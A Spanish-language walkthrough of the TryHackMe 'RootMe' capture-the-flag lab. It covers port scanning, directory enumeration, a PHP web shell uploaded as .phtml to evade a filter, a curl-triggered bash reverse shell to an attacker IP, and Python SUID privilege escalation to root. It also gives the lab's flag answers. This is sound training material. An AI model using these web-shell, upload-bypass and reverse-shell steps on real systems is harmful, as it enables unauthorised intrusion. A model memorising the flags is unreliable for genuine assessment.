---
title: THM - RootMe
tags: [tryhackme, web, linux, revese-shell, privilege-escalation]
---

# THM - RootMe

~~~shell 
$ sudo nmap -sC -sV --min-rate 4000 --open $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-10 20:27 -05
Nmap scan report for 10.10.94.0 (10.10.94.0)
Host is up (0.19s latency).
Not shown: 997 closed ports, 1 filtered port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.19 seconds
~~~

**Flag \#1:** *Scan the machine, how many ports are open?* `3`

**Flag \#2:** *What version of Apache is running?* `2.4.29`

**Flag \#3:** *What service is running on port 22?* `ssh`

## Enumeración de rutas

<https://github.com/v0re/dirb/blob/master/wordlists/common.txt>

~~~shell
wget https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt -o /usr/share/wordlists/common.txt
~~~

~~~shell
gobuster dir -u http://$IP -w /usr/share/wordlists/common.txt
~~~


Encontrarmos un ruta

## Ejecución

Crear un archivo llamado `shell.php`para subirlo en `/panel`

~~~shell
<?php
$cmd = $_GET['cmd'];
system($cmd);
?>
~~~

![](https://hackmd.io/_uploads/rkshxHqtn.png)

Como no deja subir archivos `.php` vamos a utilizar otra extensión que apache también podría interpretar para php

<https://book.hacktricks.xyz/pentesting-web/file-upload>

Podemos tambien utilizar los payloads del *intruder* de Burp para probar todas las extensiones posibles. 

En esta caso vamos a probrar con la extensión `.phtml`
![](https://hackmd.io/_uploads/ByMX7rqY3.png)

![](https://hackmd.io/_uploads/B1WI7B5t3.png)


## Ejecución remota

![](https://hackmd.io/_uploads/rJUumr5Y2.png)

Ponemos en escucha netcat
~~~shell
sudo nc -nlvp 5000
~~~

~~~shell
curl 'http://10.10.94.0/uploads/shell.phtml?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.18.41.138/5000%200%3E%261%27'
~~~

![](https://hackmd.io/_uploads/HyBLLB9Y2.png)

~~~shell
www-data@ip-10-10-84-97:/var/www/html$ tty
tty
not a tty
~~~

~~~shell
www-data@ip-10-10-84-97:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@ip-10-10-84-97:/var/www/html$ tty
tty
/dev/pts/0
www-data@ip-10-10-84-97:/var/www/html$ stty raw -echo;
~~~

## Archivo user.txt
~~~shell
$ find / -name user.txt 2>/dev/null
/var/www/user.txt
~~~

~~~shell
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
~~~



## Escalación de privilegios


~~~shell
$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount

~~~

En particular, `-perm -4000` busca archivos que tienen el bit setuid activado. El bit setuid permite que un archivo se ejecute con los permisos del propietario del archivo en lugar de los permisos del usuario que lo ejecuta. Los archivos con el bit setuid suelen ser ejecutables con privilegios especiales.

<https://gtfobins.github.io/gtfobins/python/#suid>

~~~shell
$ which python
/usr/bin/python
~~~

~~~shell
$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
# 
~~~

~~~shell
# ls /root
root.txt
# cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
~~~

![](https://hackmd.io/_uploads/Hy0CYBqth.png)
exi